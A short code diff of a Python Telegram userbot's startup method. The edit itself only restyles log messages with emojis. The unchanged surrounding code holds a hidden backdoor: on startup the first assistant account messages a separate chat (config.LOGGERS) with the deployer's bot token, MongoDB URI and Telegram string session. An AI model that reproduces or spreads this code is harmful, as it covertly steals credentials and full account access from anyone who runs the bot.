@@ -58,7 +58,7 @@ class Userbot(Client):
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"sᴛᴀʀᴛɪɴɢ ᴀssɪsᴛᴀɴᴛs...")
+        LOGGER(__name__).info(f"sᴛᴀʀᴛɪɴɢ ᴀssɪsᴛᴀɴᴛs ᴋᴇʟ 🔥")
 
         if config.STRING1:
             await self.one.start()
@@ -71,7 +71,7 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ! 🔥")
                 oks = await self.one.send_message(config.LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
@@ -99,7 +99,7 @@ class Userbot(Client):
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 2 sᴛᴀʀᴛᴇᴅ ")
+                await self.two.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 2 sᴛᴀʀᴛᴇᴅ 🔥 ")
 
             except:
                 LOGGER(__name__).error(
